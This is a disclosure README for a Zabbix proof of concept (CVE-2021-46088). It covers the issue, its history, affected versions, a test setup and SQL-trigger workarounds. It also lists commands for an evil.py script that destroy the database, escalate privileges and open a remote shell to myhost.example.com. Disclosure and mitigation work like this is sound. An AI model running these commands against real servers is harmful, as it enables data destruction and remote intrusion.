# Zbxsec-7

## About

This repository contains a proof-of-concept of a security issue in [Zabbix](https://zabbix.com).

Any user with the "Zabbix Admin" role is able to run custom shell script on the application server in the context of the application user. The impact of this will vary, depending on OS, Zabbix version and how/which users are granted the "Zabbix Admin" role, but the users will probably have full database access and access to other secrets stored on the application server.

The issue is a "feature" that gives the "Zabbix Admin" role the ability to create actions that use remote commands and custom script. This custom script is run on the application server.

Links:

* https://www.zabbix.com/documentation/current/manual/web_interface/frontend_sections/configuration/actions
* https://www.zabbix.com/documentation/current/manual/config/notifications/action/operation/remote_command

Short history:

* The issue was reported to security@zabbix.com on July 30th, 2019 (4.2 was the newest version at this point).
* It was registered as https://support.zabbix.com/browse/ZBXSEC-7 on August 23rd, 2019.
* On Desember 10th, 2020, the Zabbix team was informed that after 90 days the issue could be posted publicly.
* The registered issue has had little activity. It was closed (and resolution set as "fixed") on Jan 29th, 2021.
* On Jan 27th, 2022, this was given CVE-ID [CVE-2021-46088](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-46088).
* The issue has not been resolved.

The issue is confirmed present in the following versions of Zabbix:

* 4.0 LTS
* 4.2
* 4.4
* 5.0 LTS

In 5.4 they've [changed the way scripts are managed](https://www.zabbix.com/documentation/5.4/en/manual/installation/upgrade_notes_540#central-location-for-scripts). You need to be granted access to the Administration-\>Scripts UI element. The normal Admin role does not have this access out of the box after 5.4. You may however create roles with this access and should be aware of the implication. The Super Admin role still has the ability to create custom scripts out of the box, and has the ability to damage the application-server.

This issue was just seen as "misconfiguration" by the Zabbix team, even though PoC is able to quite easily destroy the application in their own container images.

## Zabbix test instance

A test instance of Zabbix could be created with the "zabbix-simple" git submodule. It uses [podman](https://podman.io/getting-started/) and the [container images from zabbix](https://hub.docker.com/u/zabbix).

You should clone this repository with the `--recurse-submodules` argument or use `git submodule update --init` after a simple clone.

Follow the instructions in `./zabbix-simple/README.md`.

## Proof-of-concept

If you set up an instance with "zabbix-simple" you should have installed [pyzabbix](https://pypi.org/project/pyzabbix/), a user called "User" with the role "Zabbix Admin". The password of this user is the default password "zabbix".

Destroy database:

```
python evil.py --activate http://127.0.0.1:8080 User zabbix destroy-database
```

Escalation:

```
python evil.py --activate http://127.0.0.1:8080 User zabbix escalation User
```

Remote shell connecting to myhost.example.com:8000:

```
python evil.py --activate http://127.0.0.1:8080 User zabbix remote-shell myhost.example.com 8000
```

The trigger might need a few seconds/minutes to activate.

## Workaround

The only workaround I am aware of is through database triggers that prevent you from adding custom scripts.

### Postgres

```sql
CREATE FUNCTION raise_exception() RETURNS trigger AS $$
  DECLARE
    message TEXT;
  BEGIN
    message := TG_ARGV[0];
    RAISE exception '%', message;
  END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER no_custom_script
BEFORE INSERT OR UPDATE ON opcommand
FOR EACH ROW
WHEN (NEW.type = 0)
EXECUTE FUNCTION raise_exception('No custom script');
```

### MySQL

```sql
DELIMITER //
CREATE TRIGGER no_custom_script_update
  BEFORE UPDATE ON opcommand
  FOR EACH ROW
BEGIN
  IF (NEW.type = 0) THEN
    SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'No custom script';
  END IF;
END //
CREATE TRIGGER no_custom_script_insert
  BEFORE INSERT ON opcommand
  FOR EACH ROW
BEGIN
  IF (NEW.type = 0) THEN
    SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'No custom script';
  END IF;
END //
DELIMITER ;
```
